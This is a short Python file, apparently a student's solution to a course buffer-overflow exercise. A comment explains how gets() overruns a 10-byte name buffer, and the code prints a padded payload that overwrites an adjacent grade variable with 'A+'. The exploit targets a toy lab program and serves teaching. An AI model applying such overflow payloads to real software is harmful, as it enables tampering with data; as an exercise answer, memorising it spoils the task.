'''
Buffer overflow happens because 
the name buffer is created to hold 10 bytes

Gets doesn't take in a length parameter
and instead will write x bytes of input into the
10 byte buffer it is passed... not good

grade allocated first (5 bytes), then name (10 bytes), so name sits above grade in 
the stack, meaning we can write down into it
'''
uniqname = 'hirochri'

#Uniqname 8 chars + 2 of padding + grade
print(uniqname + "\x00"*2 + "A+")
